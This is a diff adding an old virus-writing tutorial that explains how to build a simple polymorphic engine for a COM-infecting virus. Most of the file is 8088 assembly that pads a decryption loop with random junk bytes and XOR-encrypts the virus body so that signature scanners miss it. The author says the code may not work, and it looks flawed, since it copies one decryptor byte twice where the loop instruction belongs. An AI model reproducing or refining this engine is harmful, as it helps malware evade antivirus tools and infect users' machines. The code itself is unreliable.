@@ -1,0 +1,189 @@
+
+                Qarks Guide to Stupid Polymorphic Engines
+
+
+ All virus writers who reach the level of direct action COM infector have
+ a similar question, "how do I write a polymorphic engine?".  As I will
+ show you, writing a crappy little engine is easy, and is highly effective
+ against the more stupid AV software which doesn't contain decent emulation,
+ such as McAfee Virus Scan.
+
+ As you might know, there are some one byte do-nothing instructions in
+ 8088 assembly language that are perfect for use in polymorphism. These
+ are NOP, CLC, CLD, CLI, CMC, HLT, STC, STD, STI.  There are some others,
+ but for various reasons they aren't quite as good.  Anyway, the basic
+ principle behind it is to wack a mob of these bytes in-between every
+ 'real' instruction in the decryption loop, thus wrecking any basic
+ signature scanning.
+
+ The design of the engine is something like:
+
+        write garbage (one byte stuff)
+        write real instruction
+        write garbage
+        write real instruction
+        etc
+
+
+ Here's some code I've whipped up off the top of my head:
+
+
+poly_eng        proc    near
+;on entry di=place to put encrypted virus + decryptor
+;         cx=virus size
+;         bp=delta offset
+;         si=virus
+;on return cx=size of virus+decryptor
+
+        mov     word ptr dec1+1,cx
+        in      al,40h
+        mov     byte ptr dec2+1,al
+        mov     word ptr dec3+1,bp
+        mov     word ptr origdi,di
+
+        call    random
+
+        mov     ax,word ptr dec1
+        mov     word ptr [di],ax
+        add     di,2
+        mov     al,byte ptr dec1+2
+        mov     byte ptr [di],al
+        inc     di
+
+        call    random
+
+        mov     ax,word ptr dec2
+        mov     word ptr [di],ax
+        add     di,2
+
+        call    random
+
+        mov     word ptr viroff,di
+        mov     ax,word ptr dec3
+        mov     word ptr [di],ax
+        add     di,2
+        mov     al,byte ptr dec3+2
+        mov     byte ptr [di],al
+        inc     di
+
+        call    random
+
+        mov     word ptr loopoff,di
+        mov     ax,word ptr dec4
+        mov     word ptr [di],ax
+        add     di,2
+        mov     al,byte ptr dec4+2
+        mov     byte ptr [di],al
+        inc     di
+
+        call    random
+
+        mov     ax,word ptr dec5
+        mov     word ptr [di],ax
+        add     di,2
+
+        call    random
+
+        mov     al,byte ptr dec6
+        mov     byte ptr [di],al
+        inc     di
+
+        call    random
+
+        mov     al,byte ptr dec6
+        mov     byte ptr [di],al
+        add     di,2
+
+        mov     ax,word ptr loopoff
+        sub     ax,di
+        mov     byte ptr [di-1],al
+
+        push    di
+        sub     di,word ptr origdi
+        mov     ax,di
+        mov     di,word ptr viroff
+        add     word ptr [di],ax
+        pop     di
+
+        mov     cx,word ptr dec1+1
+        mov     al,byte ptr dec2+1
+encvirus:
+        mov     ah,byte ptr [si]
+        xor     ah,al
+        mov     byte ptr [di],ah
+        ror     al,1
+        inc     si
+        inc     di
+        loop    encvirus
+
+        sub     di,word ptr origdi
+        mov     cx,di
+
+        ret
+poly_eng        endp
+
+
+random  proc    near
+        
+        in      ax,40h
+        mov     cx,ax
+        and     cx,7
+writetrash:
+        in      ax,40h
+        and     ax,7
+        mov     si,offset bytetable
+        add     si,ax
+        mov     al,byte ptr [si]
+        mov     byte ptr [di],al
+        inc     di
+        loop    writetrash
+        
+        ret
+random  endp
+
+viroff  dw      0
+origdi  dw      0
+loopoff dw      0
+
+bytetable:
+        NOP
+        CLC
+        CLD
+        CLI
+        STD
+        STI
+        HLT
+        CMC
+
+dec1:
+        mov     cx,1234h                ;Virus Size
+dec2:
+        mov     al,99h                  ;Cipher Value
+dec3:
+        mov     si,1234h                ;Start of virus code
+dec4:
+        xor     byte ptr cs:[si],al     ;The actual decryption
+dec5:
+        ror     al,1
+dec6:
+        inc     si
+dec7:
+        loop    dec4
+dec8:
+
+
+ I'll explain what I've done there.  The "random" routine writes from
+ 0-7 bytes of garbage to [DI], so in-between writing the real instructions
+ I call that routine.  "Bytetable" is the garbage bytes used by "random"
+ and dec1 to dec8 is bascially the decryptor used.  At the end I patch
+ the virus pointer value so that it will point to the encrypted virus.
+
+ I'm not even sure if that code will work, and it's very poorly written
+ but if you go through it you'll work out what I'm trying to do.
+
+ If you want to see further examples of stupid polymorphic engines,
+ pinworm is exceptionally stupid in its polymorphics, and the secret
+ area in VLAD#6 has some code which is super-tiny compared to what
+ I've done here.
+
+
